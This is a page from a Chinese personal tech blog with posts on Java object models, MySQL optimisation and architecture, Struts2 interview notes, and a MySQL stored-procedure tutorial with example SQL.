<pre><code>plain ordinary java object 简单java对象
个人感觉POJO是最常见最多变的对象，是一个中间对象，也是我们最常打交道的对象。
一个POJO持久化以后就是PO
直接用它传递、传递过程中就是DTO
直接用来对应表示层就是VO
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/11/01/JavaEE开发中的几种对象模型/" data-id="cjebf17d4000s203t2tqi52ps" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JavaEE/">JavaEE</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-MySql优化" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/22/MySql优化/" class="article-date">
  <time datetime="2017-09-22T06:53:18.000Z" itemprop="datePublished">2017-09-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/22/MySql优化/">MySql优化</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>引言：在谈到到Sql优化问题时，我非常赞同”Sql优化永无止境“这句话。</p>
<h4 id="MySql优化："><a href="#MySql优化：" class="headerlink" title="MySql优化："></a>MySql优化：</h4><p>在一些大型网站项目中，数据库的并发量往往成为了整个应用的瓶颈问题。为了提高网站的并发量，就需要提高数据库的查询效率。<br>那么如何才能提高数据库的查询效率呢？这就是我今天要研究的主题：Sql优化。</p>
<p>Sql优化的几个方面：</p>
<ul>
<li><p>代码优化：</p>
<ul>
<li>代码中减少多次连接数据库进行查询，应该将多次查询封装成一条SQL进行查询，减少IO消耗；</li>
<li>避免使用 ‘SELECT * ’，查询结果中的冗余字段会增加了IO消耗。</li>
</ul>
</li>
<li><p>建表优化：</p>
<ul>
<li>每张表都应该有一个字段作为主键，这个字段的类型建议使用INT类型，而不是使用UUID；<br>  来自互联网的测试数据表明自增主键的效率高于UUID。在1000W记录表的测试下：<br>  （1）普通单条或者20条左右的记录检索，自增主键效率是uuid主键的2到3倍；<br>  （2）但是范围查询特别是上百成千条的记录查询，自增id的效率要大于uuid；<br>  （3）在范围查询做统计汇总的时候，自增id主键的效率是uuid主键1.5到2倍；<br>  （4）在存储上面，自增id所占的存储空间是uuid的1/2；<br>  （5）在写入上面，自增ID主键的效率是UUID主键的3到10倍，相差比较明显，特别是update小范围之内的数据上面。<br>  （6）在备份恢复上，自增ID主键稍微优于UUID。</li>
<li>MySql分布式架构中逐渐采用INT类型，自增步长根据服务器数量决定，这样不会存在逐渐冲突；</li>
<li><p>表中的字段为空时避免使用NULL值作为默认值；<br>因为NULL值是未知的，且占用空间，不走索引，建表的时候最好设置字段是NOT NULL 来避免这种低效率的事情的发生。或者，将默认值设置为对应数据类型的默认值，如INT对应0，VARCHAR对应空串（‘’）。<br>  另外，我们需要搞清楚 “空值” 和”NULL”的区别：</p>
<ul>
<li>空值(‘’)是不占用空间的；</li>
<li>MySQL中的NULL其实是占用空间的。</li>
</ul>
</li>
<li><p>对于多个状态字段应该使用ENUM而不是VARCHAR；<br>ENUM类型是非常快和紧凑的。在实际上，其保存的是TINYINT，可以有65535个欲存状态。但其外表上显示为字符串。这样一来，用这个字段来做一些选项列表变得相当的完美。如果你有一个字段，比如“性别”，“国家”，“民族”，“状态”或“部门”，你知道这些字段的取值是有限而且固定的，那么，你应该使用ENUM而不是VARCHAR。 </p>
</li>
</ul>
</li>
<li><p>索引优化：</p>
<pre><code>- **索引：**索引用来快速地寻找那些具有特定值的记录，所有MySQL索引都以B-树的形式保存。如果没有索引，执行查询时MySQL必须从第一个记录开始扫描整个表的所有记录，直至找到符合要求的记录。表里面的记录数量越多，这个操作的代价就越高。如果作为搜索条件的列上已经创建了索引，MySQL无需扫描任何记录即可迅速得到目标记录所在的位置。
- **合理添加索引：**
    - 索引是独立于基础数据的数据库对象，因此它会占用存储空间，大量的创建索引不但不会提高查询的效率，反而会降低查询效率；
    - 数据新增、更新会导致索引的同步更新，所以会增加数据新增、更新所消耗的成本。因此，对于更新非常频繁的字段不适合创建索引；
    -  对于频繁作为查询条件的字段需要创建索引，以提高查询效率；
    -  唯一性太差的字段不适合单独创建索引，即使频繁作为查询条件。因为多个字段重复创建的索引没有意义。

- **索引语法：**
    - 唯一索引

            ALTER TABLE tableName ADD UNIQUE indexName (column);
            CREATE UNIQUE INDEX indexName ON tableName (column);

    - 普通索引

            ALTER TABLE tableName ADD INDEX indexName(column);
            CREATE INDEX indexName ON tableName(column);

    - 主键索引

            ALTER TABLE tableName ADD PRIMARY KEY (column);

    - 全文索引

            ALTER TABLE tableName ADD FULLTEXT (column);

    - 组合索引

            ALTER TABLE tableName ADD INDEX indexName(col1,col2,...);

- **目标：**SQL语句的优化主要是对索引的优化。因为索引查询的速度十分快，不用扫描整张表。但是，SQL中的一些关键字会导致查询过程放弃使用索引。所以，SQL语句的优化主要是避免这些排斥索引的关键字。
- **Tip：**使用EXPLAIN关键字可以让你知道MySQL是如何处理你的SQL语句的。这可以帮你分析你的查询语句或是表结构的性能瓶颈。 EXPLAIN的查询结果还会告诉你你的索引主键被如何利用的，你的数据表是如何被搜索和排序的...等。
- **Join关键字：**
使用Join集连查询的时候，确保ON关键字中两个表中Join的字段是被建过索引的。而且，这些被用来Join的字段，应该是相同的类型的。这样，MySQL内部会启动为你优化Join的SQL语句的机制。
- **用where字句替换HAVING字句：**
避免使用HAVING字句，因为HAVING只会在检索出所有记录之后才对结果集进行过滤，而where则是在聚合前筛选记录，如果能通过where字句限制记录的数目，那就能减少这方面的开销。HAVING中的条件一般用于聚合函数的过滤，除此之外，应该将条件写在where字句中。
- **in和exists:**
在in和exists中通常情况下使用EXISTS，因为in不走索引。
- **LIKE:**
使用like运算符的时候，“a%”将会使用索引，而“a%c”和“%a”则会使用全表扫描。
</code></pre></li>
<li><p>缓存优化：<br>程序中通常是根据用户的输入来动态执行SQL，这时应该尽量使用参数化SQL,这样不仅可以避免SQL注入漏洞攻击，最重要数据库会对这些参数化SQL进行预编译，这样第一次执行的时候DBMS会为这个SQL语句进行查询优化并且执行预编译，这样以后再执行这个SQL的时候就直接使用预编译的结果，这样可以大大提高执行的速度。</p>
</li>
<li><p>架构优化：</p>
<ul>
<li>建立分布式数据库；</li>
<li>主从复制，读写分离；</li>
<li>尝试垂直拆分。根据不同的模块耦合度，将大系统大表拆成小系统小表；</li>
<li>如果还不行，特别是数据量巨大的单标，做sharding，水平切分。</li>
</ul>
</li>
</ul>
<p>​</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/22/MySql优化/" data-id="cjebf17dz001a203ttvj57kpw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySql/">MySql</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Struts2面试总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/18/Struts2面试总结/" class="article-date">
  <time datetime="2017-09-18T15:27:41.000Z" itemprop="datePublished">2017-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/18/Struts2面试总结/">Struts2面试总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="Struts2执行流程"><a href="#Struts2执行流程" class="headerlink" title="Struts2执行流程:"></a>Struts2执行流程:</h4><p><img src="Struts2面试总结/1.png" alt="Struts2面试总结"></p>
<pre><code>1.客户端发送HTTP请求到前端控制器StrutsPrepareAndExcetFilter,前端控制器看是不是Action
2.如果是不是Action放行,如果是Action则查找ActionMapper,返回前端控制器
3.前端控制器创建ActionProxy
4.经过Action Invocation管理的一堆拦截器后代理对象执行Action,
5.将执行结果返回模板(JSP.Freemarker),渲染视图,返回客户端
</code></pre><h4 id="Struts2是如何启动的"><a href="#Struts2是如何启动的" class="headerlink" title="Struts2是如何启动的"></a>Struts2是如何启动的</h4><pre><code>Struts2是通过StrutsPrepareAndExcutFilter进行启动的,当我们开启服务器的时候,前端控制器会执行,从而执行init方法.此方法中会加载struts.xml
配置文件,读取配置的Bean在内存中,当以后再需要Bean的时候从内存中读取
</code></pre><h4 id="Struts-default默认包的作用"><a href="#Struts-default默认包的作用" class="headerlink" title="Struts-default默认包的作用"></a>Struts-default默认包的作用</h4><pre><code>Struts-default默认包是Struts2中内置的,内部定义了许多的拦截器,比如参数封装,模型驱动,文件上传.Struts-deult包是在Striuts-default.xml中定义,Struts-defalut.xml
中不仅仅定义了一堆有用的拦截器,还定义了结果类型,拦截器栈,一般我们的package都要继承struts-default包
</code></pre><h4 id="Struts2是单利的吗"><a href="#Struts2是单利的吗" class="headerlink" title="Struts2是单利的吗"></a>Struts2是单利的吗</h4><pre><code>Struts2不是单利的,每个请求都会产生一个实例,类级别的线程安全
</code></pre><h4 id="Struts2如何访问Servlet-API"><a href="#Struts2如何访问Servlet-API" class="headerlink" title="Struts2如何访问Servlet API"></a>Struts2如何访问Servlet API</h4><pre><code>1.通过ActionContext获取三个域对象,request,session,application
2.通过ActionContext的子类ServletActionContext
3.通过ServletAware一些接口获取
</code></pre><h4 id="Struts2中常见的拦截器"><a href="#Struts2中常见的拦截器" class="headerlink" title="Struts2中常见的拦截器"></a>Struts2中常见的拦截器</h4><pre><code>ModelDriven,FileUpload,parameters,Session,TockSession,Exception,validator
</code></pre><h4 id="Struts2常见的几种结果类型"><a href="#Struts2常见的几种结果类型" class="headerlink" title="Struts2常见的几种结果类型"></a>Struts2常见的几种结果类型</h4><pre><code>dispatcher:转发到jsp(默认)
chain:转发到Action
redirect:重定向到jsp
redisrectAction:重定向到Action
stream:流
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/18/Struts2面试总结/" data-id="cjebf17eu0029203tvpa93o48" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Struts2/">Struts2</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-MySql系统架构简介" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/13/MySql系统架构简介/" class="article-date">
  <time datetime="2017-09-13T01:52:37.000Z" itemprop="datePublished">2017-09-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/13/MySql系统架构简介/">MySql系统架构简介</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="MySql系统架构图"><a href="#MySql系统架构图" class="headerlink" title="MySql系统架构图"></a>MySql系统架构图</h4><p><img src="MySql系统架构简介/1.png" alt="MySql"></p>
<p><strong>MySql系统简介：</strong><br>MySql系统的架构如上图所示，现在就图中的每个模块进行简单说明。</p>
<ul>
<li>客户端：<br>指的是MySql驱动或者命令行客户端，任何MySql用户都可以通过这种方式连接到MySql数据库。</li>
<li><p>连接管理与安全验证</p>
<ol>
<li>每个使用MySql数据库的用户都必须通过客户端工具连接到数据库之后才能使用数据库。而数据库并不能随便让任何人都能连接的上，所以，只有具备权限的用户才能正常连接到数据库。</li>
<li><p>每次连接到数据库的时候都需要创建一个连接，使用完成之后有得销毁该连接释放系统资源，从而完成一次数据库的访问。对于复杂的业务而言，可能需要频繁的连接数据库，因此会存在频繁的创建连接和销毁连接操作，而这些操作同样会造成系统资源的大量消耗，因此需要对连接进行管理。</p>
<p>连接管理与安全验证这个模块的作用就是为了解决上述两个问题的。</p>
</li>
<li><p>当用户尝试连接到数据库的时候需要通过用户名、密码、主机IP、数据库名称等信息进行进行验证，只有通过验证的用户才能连接到数据库。</p>
</li>
<li>为了避免多次频繁创建、销毁连接带来的系统资源浪费，通常会采用连接池的方式来缓存连接对象。常用到的连接池有C3P0连接池和、Druid连接池。</li>
</ol>
</li>
<li><p>解析器<br>解析器的作用是对SQL语句进行解析生成<a href="https://segmentfault.com/a/1190000008120254" target="_blank" rel="noopener">解析树</a>，以便于后续优化器进行优化。当用户连接到数据库之后，解析器会拿到用户需要执行的SQL语句，然后到缓存器中去查询是否存在该SQL语句，如果存在，直接返回该条SQL上次的执行结果。反之，会检查该SQL语句中是否存在语法错误，根据检查结果决定是否生成解析树。</p>
</li>
<li><p>优化器<br>优化器主要是对查询进行优化。优化器拿到解析器生成的解析树之后会对解析后的SQL语句进行分析，根据表的索引，数据的读取方式，确定出多种查询方法。然后通过存储引擎获取这些查询方法相关的大致数据和统计信息，从而计算每种查询方法的开销信息，然后从多种查询方式中确定出开销最小的一种查询方法。</p>
</li>
<li><p>执行器<br>执行器根据优化后的SQL语句生成执行计划，执行查询语句，返回查询结果。</p>
</li>
<li>缓存器<br>对执行查询语句及查询结果进行缓存。</li>
<li>存储引擎<br>以上几个模块构成了MySql数据库的服务层，存储引擎数据数据库的存储层，是数据库的核心模块。该模块中包括了对数据库表的锁管理、事务管理等。常见的MySQL存储引擎有：InnoDB、MEMORY、MyISAM（my-z[ei]m）。</li>
<li><p>锁管理<br>锁机制就是数据库为了保证数据的一致性而使各种共享资源在被并发访问变得有序所设计的一种规则。对于一个查询语句为了不让查询的数据被其它语句所更改就需要给数据加锁。<br>MySql中关于锁存在以下几个概念：</p>
<ul>
<li><p>排他锁（互斥锁）和共享锁<br><strong>共享锁</strong>又称为读锁，是指多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。<br><strong>排他锁</strong>又称为写锁，排他锁就是能与其他锁并存，如一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁。Mysql InnoDB引擎默认的修改数据语句，update,delete,insert都会自动给涉及到的数据加上排他锁，select语句默认不会加任何锁类型。</p>
</li>
<li><p>锁粒度：是指锁控制的精细程度。可以分为行级锁和表级锁。</p>
</li>
<li>行级锁和表级锁<br><strong>表级锁</strong>：表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题，并发量低。<br><strong>行级锁</strong>：行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。<br>虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。</li>
<li><p>锁策略</p>
</li>
<li><p>死锁： 是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种互相等待的现象，若无外力作用，它们都将无法推进下去。<br>此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。表级锁不会产生死锁。</p>
<p>在Innodb的事务管理和锁定机制中，有专门检测死锁的机制，会在系统中产生死锁之后的很短时间内就检测到该死锁的存在。当Innodb检测到系统中产生了死锁之后，Innodb会通过相应的判断来选这产生死锁的两个事务中较小的事务来回滚</p>
</li>
</ul>
</li>
<li><p>事务管理</p>
<ul>
<li>事务的特性<ol>
<li>原子性：事务是不可分割的最小工作单元，整个事务要么全部提交要么全部回滚失败。</li>
<li>一致性：数据库总是从一个一致性状态转换到另一个一致性的状态。</li>
<li>隔离性： 一个事务所做的更改在最终提交之前其它事务是不可见的。</li>
<li>持久性：事务一旦提交所做的修改就会永久保存在数据库中，即使系统崩溃，数据也不会丢失。</li>
</ol>
</li>
<li>事务的隔离级别<ol>
<li>未提交读（READ UNCOMMITTED）：未提交读隔离级别也叫读脏，就是事务可以读取其它事务未提交的数据。</li>
<li>提交读（READ COMMITTED）：其它数据库系统比如SQL Server默认的隔离级别就是提交读，已提交读隔离级别就是在事务</li>
<li>可重复读（REPEATABLE READ）：保证同一个事务中的多次相同的查询的结果是一致的，比如一个事务一开始查询了一条记录然后过了几秒钟又执行了相同的查询，保证两次查询的结果是相同的，可重复读也是mysql的默认隔离级别。</li>
<li>可串行化（SERIALIZABLE）:可串行化就是保证读取的范围内没有新的数据插入，比如事务第一次查询得到某个范围的数据，第二次查询也同样得到了相同范围的数据，中间没有新的数据插入到该范围中。</li>
</ol>
</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/13/MySql系统架构简介/" data-id="cjebf17dz001g203tovzdqzs8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySql/">MySql</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-MySQL存储过程入门教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/09/08/MySQL存储过程入门教程/" class="article-date">
  <time datetime="2017-09-08T01:06:21.000Z" itemprop="datePublished">2017-09-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/08/MySQL存储过程入门教程/">MySQL存储过程入门教程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h4 id="什么是存储过程？"><a href="#什么是存储过程？" class="headerlink" title="什么是存储过程？"></a>什么是存储过程？</h4><p>存储过程是存储在MySQL数据库中的已经经过编译好的SQL指令集。</p>
<h4 id="存储过程的特点："><a href="#存储过程的特点：" class="headerlink" title="存储过程的特点："></a>存储过程的特点：</h4><ul>
<li>因此执行时不需要数据库进行编译、优化就可以直接运行，相比直接执行SQL语句而言省去了编译和优化的环节，从而节省了系统的消耗。</li>
<li>触发器是在对数据库中数据进行增删改的时候触发执行的，是一个自动的过程。</li>
<li>存储过程能将对多个表的复杂操作封装到一起，结合MySQL事务进行执行。如果用程序来执行，那就变成了多次执行单条SQL语句，执行</li>
<li>过程中不仅每次需要数据库进行编译、优化，而且需要多次连接数据库，十分消耗性能。</li>
<li><p>存储过程能对数据库的访问权限进行细化。</p>
<h4 id="什么情况下应该使用存储过程？"><a href="#什么情况下应该使用存储过程？" class="headerlink" title="什么情况下应该使用存储过程？"></a>什么情况下应该使用存储过程？</h4></li>
<li><p>存储过程的使用要根据项目实际情况来决定。并非将所有的业务逻辑都封装成存储过程就好。因为存储过程的移植性差，不同的数据库对于存储过程的实现语法都存在差异。</p>
</li>
<li>不要将大量的运算放在存储过程中去，因为高并发下，多个用户访问，数据库的运算量会激增，导致数据库压力过大，不如将所有的计算放在web端。</li>
<li>针对并发量大的web项目，不建议大量使用存储过程，原因如上。如果要是用，请控制存储过程的复杂程度，逻辑越简单越好。</li>
</ul>
<h4 id="定义一个存储过程"><a href="#定义一个存储过程" class="headerlink" title="定义一个存储过程"></a>定义一个存储过程</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS countRow;
CREATE PROCEDURE countRow(OUT num INT)
    BEGIN
      SELECT COUNT(*) INTO num FROM mysql.user;
    END $$

DELIMITER ;
-- 调用存储过程
CALL countRow(@s);
SELECT @s as num;
</code></pre><h4 id="存储过程参数：IN-参数"><a href="#存储过程参数：IN-参数" class="headerlink" title="存储过程参数：IN 参数"></a>存储过程参数：IN 参数</h4><pre><code>-- IN 类型的参数表示在调用的时候需要传入实际值，该值的作用域仅限于存储过程内部，不会对外输出该值
DELIMITER $$
DROP PROCEDURE IF EXISTS paramIn;
CREATE PROCEDURE paramIn(IN p_in INT)
    BEGIN
      SELECT p_in AS init_val;
      SET p_in = 100;
      SELECT p_in AS update_val;
    END $$

DELIMITER ;

-- 定义一个用户变量
SET @p_in = 11;
-- 查询变量的初始值
SELECT @p_in;
-- 调用存储过程
CALL paramIn(@p_in);
-- 在此查看用户变量的值是否仍为11
SELECT @p_in;
</code></pre><h4 id="存储过程参数：OUT-参数"><a href="#存储过程参数：OUT-参数" class="headerlink" title="存储过程参数：OUT 参数"></a>存储过程参数：OUT 参数</h4><pre><code>-- OUT 类型的参数表示在调用的时候不能传入外部值，该值由存储过程在内部赋值之后返回给外部，可以在外部访问
DELIMITER $$
DROP PROCEDURE IF EXISTS paramOut;
CREATE PROCEDURE paramOut(OUT p_out INT)
    BEGIN
    SELECT p_out AS init_val;
#         SET p_out = 200;
#         SELECT p_out AS update_val;
    END $$
DELIMITER ;

-- 定义一个用户变量
SET @p_out = 22;
-- 查询变量的初始值
SELECT @p_out;
-- 调用存储过程
CALL paramOut(@p_out);
-- 在此查看用户变量的值是否已经变成200
SELECT @p_out;
</code></pre><h4 id="存储过程参数：INOUT-参数"><a href="#存储过程参数：INOUT-参数" class="headerlink" title="存储过程参数：INOUT 参数"></a>存储过程参数：INOUT 参数</h4><pre><code>-- NOUT 类型的参数表示在调用存储过程的时候可以接收外部传入的参数值，执行完后也能将新值传出
DELIMITER $$
DROP PROCEDURE IF EXISTS paramInout;
CREATE PROCEDURE paramInout(INOUT p_inout INT)
    BEGIN
      SELECT p_inout AS init_val;
      SET p_inout = 300;
      SELECT p_inout AS update_val;
    END $$

DELIMITER ;

-- 定义一个用户变量
SET @p_inout = 33;
-- 查询变量的初始值
SELECT @p_inout;
-- 调用存储过程
CALL paramInout(@p_inout);
-- 在此查看用户变量的值是否已经变成200
SELECT @p_inout;
</code></pre><h4 id="存储过程参数：不指定参数类型"><a href="#存储过程参数：不指定参数类型" class="headerlink" title="存储过程参数：不指定参数类型"></a>存储过程参数：不指定参数类型</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS paramDefault;
CREATE PROCEDURE paramDefault(p_default INT)
    BEGIN
    SELECT p_default AS init_val;
    SET p_default = 400;
    SELECT p_default AS update_val;
    END $$

DELIMITER ;

-- 定义一个用户变量
SET @p_default = 44;
-- 查询变量的初始值
SELECT @p_default;
-- 调用存储过程
CALL paramDefault(@p_default);
-- 在此查看用户变量的值是否仍是44
SELECT @p_default;
</code></pre><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>以存储过程为中心，IN 表示能将值传入到存储过程中，但是不能传出去； OUT 表示不能将值传入到存储过程中，但是能将值传出到外部；INOUT 表示能将值传入到存储过程中，执行完成后也能将值传出到外部；如果不指定参数类型，默认为 IN。</p>
<h4 id="存储过程中变量的定义：使用-DECLARE-关键字"><a href="#存储过程中变量的定义：使用-DECLARE-关键字" class="headerlink" title="存储过程中变量的定义：使用 DECLARE 关键字"></a>存储过程中变量的定义：使用 DECLARE 关键字</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS variableDefine;
CREATE PROCEDURE variableDefine()
    BEGIN
    -- 定义变量的格式：DECLARE 变量名 数据类型 （默认值可选）
    DECLARE variableName VARCHAR(20) DEFAULT &quot;defaultName&quot;;

    -- 变量赋值格式：SET 变量名 = 变量值
    SET variableName = &quot;signedValue&quot;;

    SELECT CONCAT(&quot;the new value is:&quot;, variableName) AS name;
    END $$

DELIMITER ;

CALL variableDefine();
</code></pre><h4 id="存储过程中的变量作用域：详见IN、-OUT、-INOUT"><a href="#存储过程中的变量作用域：详见IN、-OUT、-INOUT" class="headerlink" title="存储过程中的变量作用域：详见IN、 OUT、 INOUT"></a>存储过程中的变量作用域：详见IN、 OUT、 INOUT</h4><h4 id="存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF"><a href="#存储过程中的条件语句：IF-–-ELSEIF-–-ELSE-–-END-IF" class="headerlink" title="存储过程中的条件语句：IF – ELSEIF – ELSE – END IF"></a>存储过程中的条件语句：IF – ELSEIF – ELSE – END IF</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS conditional1;
CREATE PROCEDURE conditional1(IN input INT)
    BEGIN
    IF input BETWEEN 0 AND 60 THEN
        SELECT &quot;L&quot; AS GRADE;
    ELSEIF input BETWEEN 60 AND 80 THEN
        SELECT &quot;M&quot; AS GRADE;
    ELSEIF input BETWEEN 80 AND 100 THEN
        SELECT &quot;H&quot; AS GRADE;
    ELSE
        SELECT &quot;Error&quot; AS Warning;
    END IF;
    END $$
DELIMITER ;

SET @input = 90;
CALL conditional(@input);
</code></pre><h4 id="存储过程中的条件语句：CASE-–-WHEN-THEN"><a href="#存储过程中的条件语句：CASE-–-WHEN-THEN" class="headerlink" title="存储过程中的条件语句：CASE – WHEN THEN"></a>存储过程中的条件语句：CASE – WHEN THEN</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS conditional2;
CREATE PROCEDURE conditional2(IN case_val INT)
    BEGIN
    CASE case_val
        WHEN 20 THEN
            SELECT &quot;L&quot; AS GRADE;
        WHEN 30 THEN
            SELECT &quot;M&quot; AS GRADE;
        WHEN 40 THEN
            SELECT &quot;H&quot; AS GRADE;
        ELSE
            SELECT &quot;ERROR&quot; AS Warning;
    END CASE ;
    END $$

DELIMITER ;

SET @case_val = 30;
CALL conditional2(@case_val);
</code></pre><h4 id="存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE"><a href="#存储过程中的循环语句-先判断后执行-：WHILE-DO-–-END-WHILE" class="headerlink" title="存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE"></a>存储过程中的循环语句(先判断后执行)：WHILE DO – END WHILE</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS loop1;
CREATE PROCEDURE loop1(IN loop_val INT)
    BEGIN
    WHILE loop_val &gt; 10 DO
        -- doing something
    END WHILE;
    END $$
DELIMITER ;
</code></pre><h4 id="存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT"><a href="#存储过程中的循环语句-先执行后判断-：REPEAT-–-UNTIL-–-END-REPEAT" class="headerlink" title="存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT"></a>存储过程中的循环语句(先执行后判断)：REPEAT – UNTIL – END REPEAT</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS loop1;
CREATE PROCEDURE loop1(IN loop_val INT)
    BEGIN
    REPEAT
        -- doing something
        UNTIL  loop_val &gt; 10
    END REPEAT;
    END $$
DELIMITER ;
</code></pre><h4 id="存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP"><a href="#存储过程中的循环语句：LOOP-–-LEAVE-–-END-LOOP" class="headerlink" title="存储过程中的循环语句：LOOP – LEAVE – END LOOP"></a>存储过程中的循环语句：LOOP – LEAVE – END LOOP</h4><pre><code>DELIMITER $$
DROP PROCEDURE IF EXISTS loop1;
CREATE PROCEDURE loop1(IN loop_val INT)
    BEGIN
    label:LOOP
        if loop_val &gt; 10 THEN
            -- 跳出循环
            LEAVE label;
        ELSEIF loop_val &gt; 20 THEN
            -- 跳出本次循环执行下一次循环
            ITERATE label;
        END IF;
    END LOOP;
    END $$
DELIMITER ;
</code></pre><h4 id="查看存储过程的状态："><a href="#查看存储过程的状态：" class="headerlink" title="查看存储过程的状态："></a>查看存储过程的状态：</h4><pre><code>SHOW PROCEDURE STATUS LIKE &apos;conditional1&apos;;

SHOW PROCEDURE STATUS LIKE &apos;conditional%&apos;;
</code></pre><h4 id="查看存储过程定义相关信息"><a href="#查看存储过程定义相关信息" class="headerlink" title="查看存储过程定义相关信息"></a>查看存储过程定义相关信息</h4><pre><code>SHOW CREATE PROCEDURE conditional1;
</code></pre><h4 id="修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）："><a href="#修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：" class="headerlink" title="修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）："></a>修改存储过程的特征参数（MySQL中不支持修改存储过程的内容）：</h4><pre><code>ALTER PROCEDURE conditional1 SQL SECURITY DEFINER ; -- 修改存储过程的调用者（INVOKER \ DEFINER）
</code></pre><h4 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h4><pre><code>DROP PROCEDURE conditional1;
</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/09/08/MySQL存储过程入门教程/" data-id="cjebf17dj0016203tvt85unch" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySql/">MySql</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AOP/">AOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GIT/">GIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JQuery/">JQuery</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JS/">JS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JSP/">JSP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaEE/">JavaEE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaSE/">JavaSE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kotlin/">Kotlin</a></li><li class="tag-list-item"><a class="tag-list-link" 